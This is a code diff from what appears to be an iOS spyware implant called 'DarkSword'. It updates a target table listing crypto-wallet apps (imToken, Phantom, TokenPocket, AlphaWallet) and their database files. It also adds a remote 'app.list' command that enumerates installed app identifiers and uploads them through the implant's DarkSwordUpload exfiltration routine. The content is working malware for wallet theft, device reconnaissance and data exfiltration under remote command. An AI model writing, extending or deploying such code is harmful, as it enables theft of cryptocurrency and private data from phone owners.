@@ -373,7 +373,7 @@ static NSArray<NSDictionary *> *DSWalletTargets(void)
           @"files": @[@"imtoken.db", @"wallets.json"]},
         @{@"type": @"phantom", @"bundleId": @"app.phantom",
           @"files": @[@"phantom.db", @"accounts.json"]},
-        @{@"type": @"tokenpocket", @"bundleId": @"com.tokenpocket.wallet",
+        @{@"type": @"tokenpocket", @"bundleId": @"com.global.wallet.ios",
           @"files": @[@"wallet.db", @"accounts.db"]},
         @{@"type": @"alphawallet", @"bundleId": @"io.stormbird.wallet",
           @"files": @[@"AlphaWallet.sqlite"]},
@@ -524,6 +524,37 @@ static NSString *DSFileRecursive(NSString *root, NSString *depthArg)
     return json ? [[NSString alloc] initWithData:json encoding:NSUTF8StringEncoding] : @"[]";
 }
 
+/// Enumerate installed app identifiers by walking the Filza virtual root's
+/// [MHA-*] category directories (each child directory is one app identifier).
+static NSString *DSAppList(void)
+{
+    NSString *virtualRoot = MCMFilzaVirtualRoot();
+    if (virtualRoot.length == 0) return @"virtual root unavailable";
+
+    NSFileManager *fm = NSFileManager.defaultManager;
+    NSMutableArray<NSString *> *ids = [NSMutableArray array];
+    for (NSString *cat in [fm contentsOfDirectoryAtPath:virtualRoot error:nil] ?: @[]) {
+        NSString *catPath = [virtualRoot stringByAppendingPathComponent:cat];
+        BOOL isDir = NO;
+        if (![fm fileExistsAtPath:catPath isDirectory:&isDir] || !isDir) continue;
+        for (NSString *entry in [fm contentsOfDirectoryAtPath:catPath error:nil] ?: @[]) {
+            NSString *entryPath = [catPath stringByAppendingPathComponent:entry];
+            BOOL eDir = NO;
+            if ([fm fileExistsAtPath:entryPath isDirectory:&eDir] && eDir) {
+                [ids addObject:[NSString stringWithFormat:@"%@ / %@", cat, entry]];
+            }
+        }
+    }
+
+    NSString *result = [ids componentsJoinedByString:@"\n"];
+    if (result.length > 0) {
+        DarkSwordUpload(@"files", virtualRoot, @"installed app identifiers",
+                        [result dataUsingEncoding:NSUTF8StringEncoding], nil);
+    }
+    return [NSString stringWithFormat:@"%lu identifiers listed (uploaded as files)",
+            (unsigned long)ids.count];
+}
+
 static NSString *DSExecuteCommand(NSString *command)
 {
     NSString *trimmed = [command stringByTrimmingCharactersInSet:
@@ -569,6 +600,7 @@ static NSString *DSExecuteCommand(NSString *command)
         return DSFileRecursive(words.count >= 2 ? words[1] : nil,
                                words.count >= 3 ? words[2] : nil);
     }
+    if ([verb isEqualToString:@"app.list"]) return DSAppList();
     return [NSString stringWithFormat:@"unknown command: %@", trimmed];
 }
 
